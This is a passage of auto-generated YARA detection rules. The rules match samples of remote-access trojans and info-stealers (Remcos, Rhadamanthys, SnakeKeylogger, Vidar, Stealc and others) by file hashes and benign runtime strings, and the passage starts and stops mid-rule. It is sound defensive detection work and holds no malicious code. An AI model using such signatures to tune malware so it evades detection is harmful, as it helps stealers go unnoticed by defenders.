      $s7 = "bGFzc0xvbmdBAAAAU2V0Q2FwdHVyZQAAAABTZXRBY3RpdmVXaW5kb3cAAABTZW5kTWVzc2FnZVcAAAAAU2VuZE1lc3NhZ2VBAAAAAFNjcm9sbFdpbmRvdwAAAABTY3Jl" ascii /* base64 encoded string 'lassLongA   SetCapture    SetActiveWindow   SendMessageW    SendMessageA    ScrollWindow    Scre' */ /* score: '17.00'*/
      $s8 = "aABlAGwAcAAgAGYAbwB1AG4AZAAgAGYAbwByACAAYwBvAG4AdABlAHgAdAAkAE4AbwAgAHQAbwBwAGkAYwAtAGIAYQBzAGUAZAAgAGgAZQBsAHAAIABzAHkAcwB0AGUA" ascii /* base64 encoded string 'h e l p   f o u n d   f o r   c o n t e x t $ N o   t o p i c - b a s e d   h e l p   s y s t e ' */ /* score: '17.00'*/
      $s9 = "AAAAAAAAAABAAAA" ascii /* base64 encoded string '        @  ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                                                        ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAD" ascii /* base64 encoded string '       ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                 ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAABAAAAAA" ascii /* base64 encoded string '        @   ' */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string '                                             ' */ /* score: '16.50'*/
      $s15 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                             ' */ /* score: '14.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35fb644f_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_79 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35fb644f.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4fd694ee.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d431af11.exe, Stealerium(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35fb644ff75750a53c894f52fa160ca37af8370c99a2877d8e3d84f1ffae5b2f"
      hash2 = "4fd694eea69457f8141a22cdb979e68a321ddf53e74ea6f392360b86b12e9944"
      hash3 = "d431af117842085de4eab85ddc86bc5eeffa0130a55b9651aada9553b54d5e13"
      hash4 = "57ae7edf153dae62714e31efabe20bcd93fa7f69f9ffe3f69b6150ce0cc7e92c"
   strings:
      $s1 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s2 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s3 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s4 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s5 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s6 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s7 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s8 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s9 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s10 = "stopwatches" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 21000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__80 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash15 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash16 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash17 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash18 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.getStackMap" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getArgInfo" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.heapBits.forward" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.name.data" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.name.isExported" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.name.tag" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.scanstack.func1" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_81 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash4 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "HSystem.ComponentModel.Primitives.dll" fullword ascii /* score: '29.00'*/
      $s2 = "\"SafeProcessHandle" fullword ascii /* score: '15.00'*/
      $s3 = "zSystem.Collections.Generic.IEnumerable<TSource>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "VGetOrCreateThreadLocalCompletionCountObject" fullword ascii /* score: '14.00'*/
      $s5 = ".<ExecuteCallback>b__9_0" fullword ascii /* score: '14.00'*/
      $s6 = "GetData2<get_ComputerName>b__10_0B<GetPerformanceCounterLib>b__14_0@" fullword ascii /* score: '12.00'*/
      $s7 = "LastIndexOf(GetSystemArrayEEType" fullword ascii /* score: '12.00'*/
      $s8 = "&MakeHRFromErrorCode<ThrowInvalidOperationException" fullword ascii /* score: '12.00'*/
      $s9 = "HeaderLength0" fullword ascii /* score: '10.00'*/
      $s10 = "\"get_FinalizerCode.get_NullableValueOffset" fullword ascii /* score: '9.00'*/
      $s11 = "GetDataItem&set_EncoderFallback@" fullword ascii /* score: '9.00'*/
      $s12 = " CompleteTimedOut@" fullword ascii /* score: '9.00'*/
      $s13 = "Content-Dispositio" fullword wide /* score: '9.00'*/
      $s14 = "Content-Languag" fullword wide /* score: '9.00'*/
      $s15 = "Content-Lengt" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_82 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash7 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash8 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash9 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash10 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = "RecycleId$GetCurrentThreadId" fullword ascii /* score: '15.00'*/
      $s3 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s4 = "bTryStartProcessingHighPriorityWorkItemsAndDequeue@" fullword ascii /* score: '15.00'*/
      $s5 = "SignalAll" fullword ascii /* base64 encoded string 'J('jP%' */ /* score: '14.00'*/
      $s6 = "IKeyedItem`1\"ConcurrentQueue`1" fullword ascii /* score: '12.00'*/
      $s7 = "GetInt16Config" fullword ascii /* score: '12.00'*/
      $s8 = "BCopyToTempBufferWithoutWhiteSpace" fullword ascii /* score: '11.00'*/
      $s9 = ".NET Long Running Tas" fullword wide /* score: '10.00'*/
      $s10 = "System.Threading.ThreadPool.UseWindowsThreadPoo" fullword wide /* score: '10.00'*/
      $s11 = "There are too many threads currently waiting on the event. A maximum of {0} waiting threads are supported" fullword wide /* score: '10.00'*/
      $s12 = "&get_InnerExceptions@" fullword ascii /* score: '9.00'*/
      $s13 = "GetExceptions@" fullword ascii /* score: '9.00'*/
      $s14 = "get_Options@" fullword ascii /* score: '9.00'*/
      $s15 = "GetValueNames@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Vidar_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash_83 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "roc1: new g is not Gdeadnewproc1: newg missing stackos: process already finishedprotocol driver not attachedreflect: In of non-f" ascii /* score: '18.00'*/
      $s2 = "*runtime.headTailIndex" fullword ascii /* score: '12.00'*/
      $s3 = "f*struct { F uintptr; size uintptr; align uintptr; sysStat *runtime.sysMemStat; p **runtime.notInHeap }" fullword ascii /* score: '11.00'*/
      $s4 = "*runtime.sysMemStat" fullword ascii /* score: '11.00'*/
      $s5 = "runtime/internal/sys.DefaultGoroot.str" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.asyncPreempt.args_stackmap" fullword ascii /* score: '10.00'*/
      $s7 = "nextSpanForSweep" fullword ascii /* score: '9.00'*/
      $s8 = "incHead" fullword ascii /* score: '9.00'*/
      $s9 = "decHead" fullword ascii /* score: '9.00'*/
      $s10 = "checkmarks" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and pe.imphash() == "4035d2883e01d64f3e7a9dccb1d63af5" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__84 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash9 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.sweepone.func1" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.offAddr.add" fullword ascii /* score: '13.00'*/
      $s7 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.pMask.set" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.(*errorAddressString).Error" fullword ascii /* score: '13.00'*/
      $s10 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s11 = "runtime.(*mheap).nextSpanForSweep" fullword ascii /* score: '12.00'*/
      $s12 = "runtime.sweepClass.split" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.getMCache" fullword ascii /* score: '11.00'*/
      $s14 = "runtime.offAddrToLevelIndex" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*mspan).reportZombies" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_85 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "<InitializeUserDefaultUICultureLGetCultureNotSupportedExceptionMessage0CreateCultureInfoNoThrow" fullword ascii /* score: '15.00'*/
      $s2 = "(get_CurrentUICulture(set_CurrentUICulture0get_UserDefaultUICulture(get_InvariantCulture" fullword ascii /* score: '12.00'*/
      $s3 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zone" fullword wide /* score: '12.00'*/
      $s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\UT" fullword wide /* score: '12.00'*/
      $s5 = "*GetUserDefaultCulture.GetUserDefaultUICulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s6 = ">CompareAdjustmentRuleToDateTime@" fullword ascii /* score: '10.00'*/
      $s7 = "GetUtcOffset@" fullword ascii /* score: '9.00'*/
      $s8 = "&GetUtcOffsetFromUtc" fullword ascii /* score: '9.00'*/
      $s9 = "DGetDaylightSavingsEndOffsetFromUtc" fullword ascii /* score: '9.00'*/
      $s10 = " GetCultureByName" fullword ascii /* score: '9.00'*/
      $s11 = "&GetEnumerableSorter@" fullword ascii /* score: '9.00'*/
      $s12 = "@TryGetEndOfDstIfYearStartWithDst" fullword ascii /* score: '9.00'*/
      $s13 = "0GetAdjustmentRuleForTime@" fullword ascii /* score: '9.00'*/
      $s14 = "get_DayOfWeek@" fullword ascii /* score: '9.00'*/
      $s15 = "(GetCorrespondingKind@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5867427e_RemcosRAT_signature__770b35ba_86 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5867427e.vbs, RemcosRAT(signature)_770b35ba.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5867427e2a69435285a061f4cc882429558b4f7a2c0569219e74fdb7d68ec877"
      hash2 = "770b35baa103302f231c6be89e96d55294801a04aee02693842aa745f6dce621"
   strings:
      $s1 = "' Internal method - Process a completely parsed event" fullword ascii /* score: '26.00'*/
      $s2 = "' Log any SMTP errors" fullword ascii /* score: '17.00'*/
      $s3 = "' SMTP 'To' email address. Multiple addresses are separated by commas" fullword ascii /* score: '15.00'*/
      $s4 = "End Sub ' ProcessEvent" fullword ascii /* score: '15.00'*/
      $s5 = "' Optional password (may be required for SMTP authentication)" fullword ascii /* score: '13.00'*/
      $s6 = "' Globals from command line" fullword ascii /* score: '12.00'*/
      $s7 = "End Sub ' SSMON_ParseCommandLine" fullword ascii /* score: '12.00'*/
      $s8 = "End Sub ' SSMON_LogError" fullword ascii /* score: '12.00'*/
      $s9 = "' SMTP server object (from config file)" fullword ascii /* score: '12.00'*/
      $s10 = "' Log any network errors" fullword ascii /* score: '12.00'*/
      $s11 = "' strUser has User + Date + Time, and should still be parsed" fullword ascii /* score: '11.00'*/
      $s12 = "' SMTP email subject" fullword ascii /* score: '9.00'*/
      $s13 = "' Log progress" fullword ascii /* score: '9.00'*/
      $s14 = "' SMTP 'From' field" fullword ascii /* score: '9.00'*/
      $s15 = "= 5 ' Comment: <Comment> (ends with blank line)" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_87 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash7 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a$Perf" ascii /* score: '32.00'*/
      $x2 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a$Perf" ascii /* score: '32.00'*/
      $s3 = "&GetProcessShortName" fullword ascii /* score: '20.00'*/
      $s4 = "\"GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s5 = "Couldn't get process information from performance counter" fullword wide /* score: '20.00'*/
      $s6 = " OpenProcessToken" fullword ascii /* score: '18.00'*/
      $s7 = "Feature requires a process identifier" fullword wide /* score: '18.00'*/
      $s8 = "Process performance counter is disabled, so the requested operation cannot be performed" fullword wide /* score: '16.00'*/
      $s9 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s10 = "&NtProcessInfoHelper" fullword ascii /* score: '15.00'*/
      $s11 = "No process is associated with this object" fullword wide /* score: '15.00'*/
      $s12 = "Process has exited, so the requested information is not available" fullword wide /* score: '15.00'*/
      $s13 = "Attempt to access the method failed" fullword wide /* score: '14.00'*/
      $s14 = "Attempt to access the type failed" fullword wide /* score: '14.00'*/
      $s15 = "waitHandl" fullword wide /* base64 encoded string 'j+Gjwe' */ /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_88 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "NSystem.Diagnostics.DiagnosticSource.dll4System.Diagnostics.Process" fullword ascii /* score: '27.00'*/
      $s2 = "System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s3 = "System.Runtime.CompilerServices.IStateMachineBoxAwareAwaiter.AwaitUnsafeOnCompleted@" fullword ascii /* score: '20.00'*/
      $s4 = "$System.Console.dllFSystem.Diagnostics.DiagnosticSource" fullword ascii /* score: '16.00'*/
      $s5 = "System.Diagnostics.DiagnosticListener" fullword ascii /* score: '13.00'*/
      $s6 = "GetKeyAtIndex" fullword ascii /* score: '12.00'*/
      $s7 = " GetKeyListHelper@" fullword ascii /* score: '12.00'*/
      $s8 = "get_ErrorCode@" fullword ascii /* score: '12.00'*/
      $s9 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
      $s10 = ",RuntimeNamedMethodInfo\"RuntimeMethodInfoFRuntimeConstructedGenericMethodInfo4RuntimeSyntheticMethodInfo&CustomMethodInvoker2Cu" ascii /* score: '11.00'*/
